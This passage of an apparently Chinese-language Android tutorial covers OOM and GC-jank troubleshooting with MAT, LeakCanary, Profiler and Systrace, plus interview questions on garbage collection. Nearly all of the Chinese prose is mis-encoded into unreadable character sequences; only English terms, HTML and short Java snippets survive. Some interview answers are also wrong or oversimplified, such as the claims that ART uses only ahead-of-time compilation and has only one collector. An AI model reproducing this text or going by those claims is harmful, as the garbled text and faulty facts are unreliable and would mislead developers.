<li>å¦‚æœçœ‹åˆ°OutOfMemoryErrorï¼Œè¯´æ˜å‘ç”Ÿäº†OOM</li>
<li>æŸ¥çœ‹é”™è¯¯ä¿¡æ¯ï¼Œäº†è§£OOMçš„ç±»å‹</li>
</ul>
<p><strong>æ–¹æ³•2ï¼šé€šè¿‡Profilerè§‚å¯Ÿå†…å­˜</strong></p>
<ul>
<li>åœ¨Profilerä¸­è§‚å¯Ÿå†…å­˜ä½¿ç”¨æƒ…å†µ</li>
<li>å¦‚æœå†…å­˜æŒç»­å¢é•¿ï¼Œæ¥è¿‘å†…å­˜ä¸Šé™ï¼Œå¯èƒ½å‘ç”ŸOOM</li>
<li>åœ¨OOMå‰ç”Ÿæˆå †è½¬å‚¨ï¼Œåˆ†æåŸå› </li>
</ul>
<p><strong>OOMçš„ç±»å‹ï¼š</strong></p>
<ul>
<li><strong>Java heap space</strong>ï¼šå †å†…å­˜æº¢å‡ºï¼ˆæœ€å¸¸è§ï¼‰</li>
<li><strong>PermGen space</strong>ï¼šæ–¹æ³•åŒºæº¢å‡ºï¼ˆAndroidä¸ä½¿ç”¨ï¼‰</li>
<li><strong>Direct buffer memory</strong>ï¼šç›´æ¥å†…å­˜æº¢å‡ºï¼ˆè¾ƒå°‘è§ï¼‰</li>
</ul>
<p><strong>è¯¦ç»†æ’æŸ¥æ­¥éª¤ï¼š</strong></p>
<p><strong>æ­¥éª¤1ï¼šç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li><strong>åœ¨OOMæ—¶</strong>ï¼šç³»ç»Ÿå¯èƒ½è‡ªåŠ¨ç”Ÿæˆå †è½¬å‚¨ï¼ˆå¦‚æœé…ç½®äº†ï¼‰</li>
<li><strong>åœ¨OOMå‰</strong>ï¼šå¦‚æœå‘ç°å†…å­˜æŒç»­å¢é•¿ï¼Œæå‰ç”Ÿæˆå †è½¬å‚¨</li>
<li><strong>æ‰‹åŠ¨ç”Ÿæˆ</strong>ï¼šä½¿ç”¨Profileræ‰‹åŠ¨ç”Ÿæˆå †è½¬å‚¨</li>
<li>å¯¼å‡ºä¸ºhprofæ–‡ä»¶</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šä½¿ç”¨MATåˆ†æå †è½¬å‚¨</strong></p>
<ul>
<li>ç”¨MATæ‰“å¼€hprofæ–‡ä»¶</li>
<li>ç­‰å¾…MATåˆ†æå®Œæˆ</li>
<li>æŸ¥çœ‹MATçš„"Leak Suspects"æŠ¥å‘Šï¼ˆå¦‚æœæœ‰ï¼‰</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Histogram"åŠŸèƒ½</li>
<li>æŒ‰"Retained Heap"æ’åº</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
<li>åˆ†æè¿™äº›ç±»ä¸ºä»€ä¹ˆå ç”¨è¿™ä¹ˆå¤šå†…å­˜</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šåˆ†æå¯¹è±¡å¼•ç”¨å…³ç³»</strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Dominator Tree"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å¯¹è±¡çš„å¼•ç”¨å…³ç³»</li>
<li>æ‰¾å‡ºå“ªäº›å¯¹è±¡æŒæœ‰å¤§é‡å†…å­˜</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šåˆ†æå¼•ç”¨é“¾ï¼Œæ‰¾å‡ºæ— æ³•å›æ”¶çš„åŸå› </strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Path to GC Roots"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å¯¹è±¡çš„å¼•ç”¨é“¾</li>
<li>åˆ†æä¸ºä»€ä¹ˆå¯¹è±¡æ— æ³•è¢«å›æ”¶ï¼š
<ul>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šå¯¹è±¡è¢«å¼•ç”¨ï¼Œæ— æ³•å›æ”¶</li>
<li><strong>å¤§å¯¹è±¡</strong>ï¼šå¯¹è±¡æœ¬èº«å¾ˆå¤§</li>
<li><strong>å¯¹è±¡å¤ªå¤š</strong>ï¼šåˆ›å»ºäº†å¤ªå¤šå¯¹è±¡</li>
</ul>
</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šä¿®å¤é—®é¢˜</strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¿®å¤é—®é¢˜ï¼š
<ul>
<li><strong>å¦‚æœæ˜¯å†…å­˜æ³„æ¼</strong>ï¼šä¿®å¤æ³„æ¼ï¼ˆä½¿ç”¨å¼±å¼•ç”¨ã€åŠæ—¶æ¸…ç†ï¼‰</li>
<li><strong>å¦‚æœæ˜¯å¤§å¯¹è±¡</strong>ï¼šä¼˜åŒ–å¤§å¯¹è±¡ï¼ˆå‹ç¼©ã€åŠæ—¶é‡Šæ”¾ï¼‰</li>
<li><strong>å¦‚æœæ˜¯å¯¹è±¡å¤ªå¤š</strong>ï¼šå‡å°‘å¯¹è±¡åˆ›å»ºï¼ˆä½¿ç”¨å¯¹è±¡æ± ã€åˆ†æ‰¹åŠ è½½ï¼‰</li>
</ul>
</li>
</ul>
<p><strong>å¸¸è§åŸå› å’Œè§£å†³æ–¹æ¡ˆï¼š</strong></p>
<p><strong>1. å†…å­˜æ³„æ¼ï¼ˆæœ€å¸¸è§ï¼‰</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šå¯¹è±¡æ— æ³•å›æ”¶ï¼Œå†…å­˜é€æ¸è¢«å ç”¨</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š
<ul>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>ä½¿ç”¨MATåˆ†æå †è½¬å‚¨ï¼Œæ‰¾å‡ºæ³„æ¼å¯¹è±¡</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼ï¼ˆä½¿ç”¨å¼±å¼•ç”¨ã€åŠæ—¶æ¸…ç†ï¼‰</li>
</ul>
</li>
</ul>
<p><strong>2. ä¸€æ¬¡æ€§åŠ è½½å¤ªå¤šæ•°æ®</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šä¸€æ¬¡æ€§åŠ è½½å¤§é‡æ•°æ®åˆ°å†…å­˜</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š
<ul>
<li>åˆ†æ‰¹åŠ è½½æ•°æ®</li>
<li>ä½¿ç”¨åˆ†é¡µåŠ è½½</li>
<li>åŠæ—¶é‡Šæ”¾ä¸éœ€è¦çš„æ•°æ®</li>
</ul>
</li>
</ul>
<p><strong>3. å¤§å¯¹è±¡å ç”¨è¿‡å¤šå†…å­˜</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šåŠ è½½è¿‡å¤§çš„å›¾ç‰‡ã€åˆ›å»ºè¿‡å¤§çš„æ•°ç»„</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š
<ul>
<li>å‹ç¼©å›¾ç‰‡å¤§å°</li>
<li>åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡</li>
<li>ä½¿ç”¨å¯¹è±¡æ± ç®¡ç†å¤§å¯¹è±¡</li>
</ul>
</li>
</ul>
<p><strong>4. é¢‘ç¹åˆ›å»ºå¯¹è±¡</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šä»£ç ä¸­é¢‘ç¹åˆ›å»ºå¯¹è±¡</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š
<ul>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
<li>é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>ä¼˜åŒ–ä»£ç ï¼Œå‡å°‘å¯¹è±¡åˆ›å»º</li>
</ul>
</li>
</ul>
<p><strong>5. Androidè®¾å¤‡å†…å­˜é™åˆ¶</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šä¸åŒè®¾å¤‡æœ‰ä¸åŒçš„å †å†…å­˜ä¸Šé™</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š
<ul>
<li>ä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
<li>é¿å…å†…å­˜æ³„æ¼</li>
<li>åˆç†ä½¿ç”¨ç¼“å­˜</li>
<li>åœ¨AndroidManifest.xmlä¸­è®¾ç½®largeHeap="true"ï¼ˆæ²»æ ‡ä¸æ²»æœ¬ï¼‰</li>
</ul>
</li>
</ul>
<p><strong>æ’æŸ¥å·¥å…·ï¼š</strong></p>
<ul>
<li><strong>MAT</strong>ï¼šåˆ†æå †è½¬å‚¨ï¼Œæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
<li><strong>LeakCanary</strong>ï¼šæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li><strong>Android Studio Profiler</strong>ï¼šå®æ—¶ç›‘æ§å†…å­˜ä½¿ç”¨</li>
</ul>
<h4 data-id="heading-73">5.2.5 åº”ç”¨å¡é¡¿é—®é¢˜æ’æŸ¥</h4>
<p><strong>é—®é¢˜æè¿°ï¼š</strong> åº”ç”¨è¿è¡Œå¡é¡¿ï¼Œç”¨æˆ·ä½“éªŒå·®</p>
<p><strong>å¦‚ä½•è¯†åˆ«ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šç”¨æˆ·åé¦ˆ</strong></p>
<ul>
<li>ç”¨æˆ·åé¦ˆåº”ç”¨å¡é¡¿</li>
<li>è§‚å¯Ÿåº”ç”¨è¿è¡Œæƒ…å†µï¼Œå‘ç°å¡é¡¿</li>
</ul>
<p><strong>æ–¹æ³•2ï¼šé€šè¿‡Systraceåˆ†æ</strong></p>
<ul>
<li>ä½¿ç”¨Systraceè®°å½•åº”ç”¨è¿è¡Œæƒ…å†µ</li>
<li>æŸ¥çœ‹ä¸»çº¿ç¨‹çš„æ‰§è¡Œæƒ…å†µ</li>
<li>å¦‚æœä¸»çº¿ç¨‹æœ‰çº¢è‰²å¸§ï¼ˆæ‰å¸§ï¼‰ï¼Œè¯´æ˜æœ‰å¡é¡¿</li>
<li>æŸ¥çœ‹å¡é¡¿çš„æ—¶é—´æ®µ</li>
</ul>
<p><strong>æ–¹æ³•3ï¼šé€šè¿‡Profilerè§‚å¯Ÿ</strong></p>
<ul>
<li>åœ¨Profilerä¸­è§‚å¯ŸCPUä½¿ç”¨æƒ…å†µ</li>
<li>å¦‚æœCPUä½¿ç”¨ç‡çªç„¶ä¸‹é™ï¼Œå¯èƒ½æœ‰å¡é¡¿</li>
<li>æŸ¥çœ‹GCäº‹ä»¶æ˜¯å¦ä¸å¡é¡¿æ—¶é—´å¯¹åº”</li>
</ul>
<p><strong>åˆ¤æ–­æ ‡å‡†ï¼š</strong></p>
<ul>
<li><strong>æ­£å¸¸æƒ…å†µ</strong>ï¼šåº”ç”¨è¿è¡Œæµç•…ï¼Œå¸§ç‡ç¨³å®š</li>
<li><strong>å¼‚å¸¸æƒ…å†µ</strong>ï¼šåº”ç”¨å¶å°”å¡é¡¿ï¼Œç”¨æˆ·èƒ½æ„Ÿè§‰åˆ°</li>
<li><strong>ä¸¥é‡æƒ…å†µ</strong>ï¼šåº”ç”¨é¢‘ç¹å¡é¡¿ï¼Œä¸¥é‡å½±å“ç”¨æˆ·ä½“éªŒ</li>
</ul>
<p><strong>å¡é¡¿çš„å¯èƒ½åŸå› ï¼š</strong></p>
<p><strong>1. GCå¯¼è‡´çš„å¡é¡¿ï¼ˆå¸¸è§ï¼‰</strong></p>
<ul>
<li>GCæš‚åœä¸»çº¿ç¨‹ï¼Œå¯¼è‡´å¡é¡¿</li>
<li>Full GCæš‚åœæ—¶é—´é•¿ï¼Œæ›´å®¹æ˜“å¯¼è‡´å¡é¡¿</li>
<li>GCé¢‘ç¹è§¦å‘ï¼Œå¯¼è‡´é¢‘ç¹å¡é¡¿</li>
</ul>
<p><strong>2. ä¸»çº¿ç¨‹æ‰§è¡Œè€—æ—¶æ“ä½œ</strong></p>
<ul>
<li>ä¸»çº¿ç¨‹æ‰§è¡Œè€—æ—¶æ“ä½œï¼ˆæ¯”å¦‚ç½‘ç»œè¯·æ±‚ã€æ–‡ä»¶IOï¼‰</li>
<li>å¯¼è‡´ä¸»çº¿ç¨‹é˜»å¡ï¼Œåº”ç”¨å¡é¡¿</li>
</ul>
<p><strong>3. å¸ƒå±€å¤æ‚</strong></p>
<ul>
<li>å¸ƒå±€å±‚çº§å¤ªæ·±ï¼Œæ¸²æŸ“è€—æ—¶</li>
<li>å¯¼è‡´UIæ¸²æŸ“æ…¢ï¼Œåº”ç”¨å¡é¡¿</li>
</ul>
<p><strong>4. å…¶ä»–åŸå› </strong></p>
<ul>
<li>åŠ¨ç”»æ€§èƒ½é—®é¢˜</li>
<li>å›¾ç‰‡åŠ è½½é—®é¢˜</li>
<li>å…¶ä»–æ€§èƒ½é—®é¢˜</li>
</ul>
<p><strong>è¯¦ç»†æ’æŸ¥æ­¥éª¤ï¼ˆé’ˆå¯¹GCå¯¼è‡´çš„å¡é¡¿ï¼‰ï¼š</strong></p>
<p><strong>æ­¥éª¤1ï¼šä½¿ç”¨Systraceåˆ†æå¡é¡¿</strong></p>
<ul>
<li>ä½¿ç”¨Systraceè®°å½•åº”ç”¨è¿è¡Œæƒ…å†µ</li>
<li>æ“ä½œåº”ç”¨ï¼Œè§¦å‘å¡é¡¿</li>
<li>åœæ­¢è®°å½•ï¼ŒæŸ¥çœ‹ç»“æœ</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šæŸ¥çœ‹ä¸»çº¿ç¨‹æ‰§è¡Œæƒ…å†µ</strong></p>
<ul>
<li>åœ¨Systraceä¸­æ‰¾åˆ°"main"çº¿ç¨‹</li>
<li>æŸ¥çœ‹ä¸»çº¿ç¨‹çš„æ‰§è¡Œæƒ…å†µ</li>
<li>æŸ¥çœ‹æ˜¯å¦æœ‰çº¢è‰²å¸§ï¼ˆæ‰å¸§ï¼‰</li>
<li>æŸ¥çœ‹å¡é¡¿çš„æ—¶é—´æ®µ</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šæŸ¥çœ‹GCäº‹ä»¶æ˜¯å¦ä¸å¡é¡¿æ—¶é—´å¯¹åº”</strong></p>
<ul>
<li>åœ¨Systraceä¸­æŸ¥æ‰¾GCäº‹ä»¶</li>
<li>æŸ¥çœ‹GCäº‹ä»¶æ˜¯å¦ä¸å¡é¡¿æ—¶é—´å¯¹åº”</li>
<li>å¦‚æœå¯¹åº”ï¼Œè¯´æ˜GCå¯¼è‡´äº†å¡é¡¿</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šåˆ†æGCåŸå› </strong></p>
<ul>
<li>æŸ¥çœ‹GCç±»å‹ï¼šæ˜¯Partial GCè¿˜æ˜¯Full GC</li>
<li>æŸ¥çœ‹GCè€—æ—¶ï¼šGCæš‚åœæ—¶é—´æ˜¯å¦è¿‡é•¿</li>
<li>æŸ¥çœ‹GCé¢‘ç‡ï¼šGCæ˜¯å¦è¿‡äºé¢‘ç¹</li>
<li>åˆ†æGCåŸå› ï¼šä¸ºä»€ä¹ˆè§¦å‘GC</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šä½¿ç”¨Profilerè¿›ä¸€æ­¥åˆ†æ</strong></p>
<ul>
<li>ä½¿ç”¨ProfileræŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ</li>
<li>æŸ¥çœ‹GCäº‹ä»¶å’Œå†…å­˜æ›²çº¿</li>
<li>åˆ†æå†…å­˜ä½¿ç”¨æ˜¯å¦æ­£å¸¸</li>
<li>æ£€æŸ¥æ˜¯å¦æœ‰å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šä¼˜åŒ–ä»£ç ï¼Œå‡å°‘GC</strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¼˜åŒ–ä»£ç ï¼š
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»º</li>
<li>é¿å…è§¦å‘Full GC</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼</li>
<li>ä¼˜åŒ–åˆ—è¡¨æ»‘åŠ¨ã€åŠ¨ç”»ç­‰åœºæ™¯</li>
</ul>
</li>
</ul>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆï¼š</strong></p>
<p><strong>1. å‡å°‘å¯¹è±¡åˆ›å»ºï¼ˆæœ€é‡è¦ï¼‰</strong></p>
<ul>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
<li>é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>ä½¿ç”¨åŸºæœ¬ç±»å‹æ›¿ä»£åŒ…è£…ç±»å‹</li>
<li><strong>ç¤ºä¾‹</strong>ï¼šåˆ—è¡¨æ»‘åŠ¨æ—¶ï¼Œé¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºå¯¹è±¡</li>
</ul>
<p><strong>2. é¿å…è§¦å‘Full GC</strong></p>
<ul>
<li>Full GCæš‚åœæ—¶é—´é•¿ï¼Œåº”è¯¥å°½é‡é¿å…</li>
<li>æ–¹æ³•ï¼š
<ul>
<li>é¿å…å†…å­˜æ³„æ¼</li>
<li>å‡å°‘è€å¹´ä»£å¯¹è±¡</li>
<li>ä¸è¦æ˜¾å¼è°ƒç”¨System.gc()</li>
</ul>
</li>
</ul>
<p><strong>3. ä¼˜åŒ–åˆ—è¡¨æ»‘åŠ¨</strong></p>
<ul>
<li>ViewHolderå¤ç”¨</li>
<li>é¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºå¯¹è±¡</li>
<li>ä½¿ç”¨å¯¹è±¡æ± </li>
<li>å‡å°‘GCé¢‘ç‡</li>
</ul>
<p><strong>4. ä¼˜åŒ–åŠ¨ç”»</strong></p>
<ul>
<li>å¤ç”¨åŠ¨ç”»å¯¹è±¡</li>
<li>é¿å…é¢‘ç¹åˆ›å»ºåŠ¨ç”»å¯¹è±¡</li>
<li>å‡å°‘GCé¢‘ç‡</li>
</ul>
<p><strong>5. ä¿®å¤å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼ï¼Œå‡å°‘Full GC</li>
</ul>
<p><strong>æ’æŸ¥å·¥å…·ï¼š</strong></p>
<ul>
<li><strong>Systrace</strong>ï¼šåˆ†æå¡é¡¿ï¼ŒæŸ¥çœ‹GCå¯¹ä¸»çº¿ç¨‹çš„å½±å“</li>
<li><strong>Android Studio Profiler</strong>ï¼šå®æ—¶ç›‘æ§å†…å­˜å’ŒGC</li>
<li><strong>logcat</strong>ï¼šæŸ¥çœ‹GCæ—¥å¿—ï¼Œåˆ†æGCé¢‘ç‡å’Œè€—æ—¶</li>
</ul>
<hr/>
<h2 data-id="heading-74">ç¬¬å…­éƒ¨åˆ†ï¼šé¢è¯•é¢˜</h2>
<h4 data-id="heading-75">6.1 åŸºç¡€æ¦‚å¿µé¢˜ï¼ˆå¿…è€ƒï¼‰</h4>
<h4 data-id="heading-76">6.1.1 GCåŸºç¡€æ¦‚å¿µ</h4>
<p><strong>1. ä»€ä¹ˆæ˜¯åƒåœ¾å›æ”¶ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>åƒåœ¾å›æ”¶ï¼ˆGarbage Collectionï¼ŒGCï¼‰æ˜¯è‡ªåŠ¨ç®¡ç†å†…å­˜çš„æœºåˆ¶ï¼Œèƒ½å¤Ÿè‡ªåŠ¨è¯†åˆ«å’Œå›æ”¶ä¸å†ä½¿ç”¨çš„å¯¹è±¡ï¼Œé‡Šæ”¾å®ƒä»¬å ç”¨çš„å†…å­˜ç©ºé—´ã€‚</p>
<p><strong>æ ¸å¿ƒç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>è‡ªåŠ¨ç®¡ç†</strong>ï¼šä¸éœ€è¦å¼€å‘è€…æ‰‹åŠ¨é‡Šæ”¾å†…å­˜ï¼Œé¿å…å¿˜è®°é‡Šæ”¾å¯¼è‡´çš„å†…å­˜æ³„æ¼</li>
<li><strong>è‡ªåŠ¨è¯†åˆ«</strong>ï¼šç³»ç»Ÿè‡ªåŠ¨åˆ¤æ–­å“ªäº›å¯¹è±¡æ˜¯"åƒåœ¾"ï¼ˆä¸å†ä½¿ç”¨ï¼‰</li>
<li><strong>è‡ªåŠ¨å›æ”¶</strong>ï¼šè‡ªåŠ¨é‡Šæ”¾åƒåœ¾å¯¹è±¡å ç”¨çš„å†…å­˜ç©ºé—´</li>
</ul>
<p><strong>åœ¨Androidä¸­çš„é‡è¦æ€§ï¼š</strong></p>
<ul>
<li>Androidè®¾å¤‡å†…å­˜æœ‰é™ï¼Œå¿…é¡»åˆç†ä½¿ç”¨</li>
<li>GCæ€§èƒ½ç›´æ¥å½±å“åº”ç”¨æµç•…åº¦</li>
<li>é¢‘ç¹GCä¼šå¯¼è‡´å¡é¡¿ï¼Œå½±å“ç”¨æˆ·ä½“éªŒ</li>
<li>å†…å­˜ä¸è¶³å¯èƒ½å¯¼è‡´åº”ç”¨è¢«ç³»ç»Ÿæ€æ­»</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createObjects</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-comment">// obj1å’Œobj2ä¸å†è¢«å¼•ç”¨åï¼ŒGCä¼šè‡ªåŠ¨å›æ”¶å®ƒä»¬å ç”¨çš„å†…å­˜</span>
    <span class="hljs-comment">// å¼€å‘è€…ä¸éœ€è¦æ‰‹åŠ¨é‡Šæ”¾</span>
}
</code></pre>
<p><strong>2. Androidä½¿ç”¨çš„æ˜¯ä»€ä¹ˆè¿è¡Œæ—¶ï¼Ÿä¸JVMçš„åŒºåˆ«ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>Androidä½¿ç”¨çš„æ˜¯<strong>ARTï¼ˆAndroid Runtimeï¼‰</strong>ï¼Œä¸æ˜¯JVMã€‚</p>
<p><strong>ä¸»è¦åŒºåˆ«ï¼š</strong></p>
<ol>
<li>
<p><strong>ç¼–è¯‘æ–¹å¼ä¸åŒ</strong>ï¼š</p>
<ul>
<li><strong>ART</strong>ï¼šAOTç¼–è¯‘ï¼ˆAhead-Of-Timeï¼‰ï¼Œåº”ç”¨å®‰è£…æ—¶ç¼–è¯‘ä¸ºæœºå™¨ç </li>
<li><strong>JVM</strong>ï¼šJITç¼–è¯‘ï¼ˆJust-In-Timeï¼‰ï¼Œè¿è¡Œæ—¶ç¼–è¯‘ä¸ºæœºå™¨ç </li>
</ul>
</li>
<li>
<p><strong>GCæœºåˆ¶ä¸åŒ</strong>ï¼š</p>
<ul>
<li><strong>ART</strong>ï¼šåªæœ‰ä¸€ç§æ”¶é›†å™¨ï¼ˆå¹¶å‘å¤åˆ¶æ”¶é›†å™¨ï¼‰ï¼Œç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨</li>
<li><strong>JVM</strong>ï¼šæœ‰å¤šç§æ”¶é›†å™¨å¯é€‰ï¼ˆSerialã€Parallelã€CMSã€G1ã€ZGCç­‰ï¼‰ï¼Œå¼€å‘è€…éœ€è¦é€‰æ‹©</li>
</ul>
</li>
<li>
<p><strong>ä¼˜åŒ–æ–¹å‘ä¸åŒ</strong>ï¼š</p>
<ul>
<li><strong>ART</strong>ï¼šé’ˆå¯¹ä½å»¶è¿Ÿä¼˜åŒ–ï¼Œé€‚åˆäº¤äº’å¼åº”ç”¨ï¼ˆå‡å°‘å¡é¡¿ï¼‰</li>
<li><strong>JVM</strong>ï¼šæœ‰å¤šç§ä¼˜åŒ–æ–¹å‘ï¼ˆååé‡ã€å»¶è¿Ÿã€å†…å­˜å ç”¨ç­‰ï¼‰</li>
</ul>
</li>
<li>
<p><strong>å†…å­˜ç®¡ç†ä¸åŒ</strong>ï¼š</p>
<ul>
<li><strong>ART</strong>ï¼šé’ˆå¯¹Androidè®¾å¤‡å†…å­˜æœ‰é™çš„ç‰¹ç‚¹ä¼˜åŒ–</li>
<li><strong>JVM</strong>ï¼šé€šå¸¸è¿è¡Œåœ¨æœåŠ¡å™¨ä¸Šï¼Œå†…å­˜ç›¸å¯¹å……è¶³</li>
</ul>
</li>
</ol>
<p><strong>3. ARTçš„GCä¸JVMçš„GCæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ARTçš„GCç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>åªæœ‰ä¸€ç§æ”¶é›†å™¨</strong>ï¼šå¹¶å‘å¤åˆ¶æ”¶é›†å™¨ï¼ˆConcurrent Copyingï¼ŒCCï¼‰</li>
<li><strong>ç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨</strong>ï¼šå¼€å‘è€…ä¸éœ€è¦é€‰æ‹©ï¼Œç³»ç»Ÿè‡ªåŠ¨ç®¡ç†</li>
<li><strong>ä½å»¶è¿Ÿè®¾è®¡</strong>ï¼šé’ˆå¯¹äº¤äº’å¼åº”ç”¨ä¼˜åŒ–ï¼Œå‡å°‘å¡é¡¿</li>
<li><strong>å¹¶å‘å›æ”¶</strong>ï¼šåœ¨åå°çº¿ç¨‹æ‰§è¡Œï¼Œå°½é‡ä¸æš‚åœä¸»çº¿ç¨‹</li>
<li><strong>å¢é‡å›æ”¶</strong>ï¼šæŠŠå¤§é‡å›æ”¶å·¥ä½œåˆ†æˆå°ä»½ï¼Œé¿å…ä¸€æ¬¡æ€§å¡é¡¿å¤ªä¹…</li>
</ul>
<p><strong>JVMçš„GCç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>å¤šç§æ”¶é›†å™¨å¯é€‰</strong>ï¼šSerialã€Parallelã€CMSã€G1ã€ZGCã€Shenandoahç­‰</li>
<li><strong>éœ€è¦å¼€å‘è€…é€‰æ‹©</strong>ï¼šæ ¹æ®åº”ç”¨ç‰¹ç‚¹é€‰æ‹©åˆé€‚çš„æ”¶é›†å™¨</li>
<li><strong>å¤šç§ä¼˜åŒ–æ–¹å‘</strong>ï¼šååé‡ä¼˜å…ˆã€å»¶è¿Ÿä¼˜å…ˆã€å†…å­˜å ç”¨ä¼˜å…ˆç­‰</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆARTåªæœ‰ä¸€ç§æ”¶é›†å™¨ï¼Ÿ</strong></p>
<ul>
<li>é’ˆå¯¹Androidåœºæ™¯ä¼˜åŒ–ï¼ˆä½å»¶è¿Ÿã€äº¤äº’å¼åº”ç”¨ï¼‰</li>
<li>ä¸éœ€è¦å¼€å‘è€…é€‰æ‹©ï¼Œç®€åŒ–å¼€å‘</li>
<li>ç³»ç»Ÿè‡ªåŠ¨ç®¡ç†ï¼Œæé«˜æ•ˆç‡</li>
</ul>
<p><strong>4. å¦‚ä½•åˆ¤æ–­å¯¹è±¡å·²æ­»ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>Androidä½¿ç”¨<strong>å¯è¾¾æ€§åˆ†æç®—æ³•</strong>æ¥åˆ¤æ–­å¯¹è±¡æ˜¯å¦å·²æ­»ã€‚</p>
<p><strong>ç®—æ³•åŸç†ï¼š</strong></p>
<ol>
<li>ä»ä¸€ç»„ç§°ä¸º"GC Roots"çš„å¯¹è±¡å¼€å§‹</li>
<li>å‘ä¸‹æœç´¢ï¼Œæ ‡è®°æ‰€æœ‰èƒ½å¤Ÿä»GC Rootsåˆ°è¾¾çš„å¯¹è±¡ï¼ˆå­˜æ´»å¯¹è±¡ï¼‰</li>
<li>æ— æ³•ä»GC Rootsåˆ°è¾¾çš„å¯¹è±¡å°±æ˜¯"åƒåœ¾"ï¼Œå¯ä»¥è¢«å›æ”¶</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆä¸ç”¨å¼•ç”¨è®¡æ•°ç®—æ³•ï¼Ÿ</strong></p>
<ul>
<li>å¼•ç”¨è®¡æ•°ç®—æ³•æ— æ³•å¤„ç†å¾ªç¯å¼•ç”¨</li>
<li>ä¸¤ä¸ªå¯¹è±¡ç›¸äº’å¼•ç”¨æ—¶ï¼Œå¼•ç”¨è®¡æ•°æ°¸è¿œä¸ä¸º0ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼</li>
<li>å¯è¾¾æ€§åˆ†æç®—æ³•å¯ä»¥å¤„ç†å¾ªç¯å¼•ç”¨ï¼Œå‡†ç¡®åˆ¤æ–­å¯¹è±¡æ˜¯å¦å¯å›æ”¶</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¯è¾¾æ€§åˆ†æå¯ä»¥å¤„ç†å¾ªç¯å¼•ç”¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    Node next;
}

